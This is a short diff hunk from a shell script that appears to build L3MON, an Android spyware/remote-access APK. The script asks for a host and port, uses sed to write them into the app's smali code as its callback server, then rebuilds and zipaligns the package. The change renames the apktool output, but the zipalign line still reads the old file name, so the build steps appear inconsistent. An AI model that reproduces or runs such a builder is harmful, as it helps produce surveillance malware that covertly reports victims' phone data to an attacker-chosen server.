@@ -52,7 +52,7 @@ then
 	read -p "    [✯] 𝗛𝗼𝘀𝘁 ➧ " host
 	read -p "    [✯] 𝗣𝗼𝗿𝘁 ➧ " port
 	sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile
-	apktool b "$appPath" -o $PREFIX/share/L3MON/app.apk > /dev/null 2>&1 
+	apktool b "$appPath" -o $PREFIX/share/L3MON/L3MON.apk > /dev/null 2>&1 
 	zipalign -v 4 app.apk L3MON.apk > /dev/null 2>&1
 	rm -rf app.apk
 	printf "${IGreen}    [✔] 𝗔𝗽𝗸 𝗕𝘂𝗶𝗹𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹\n" | pv -qL 30
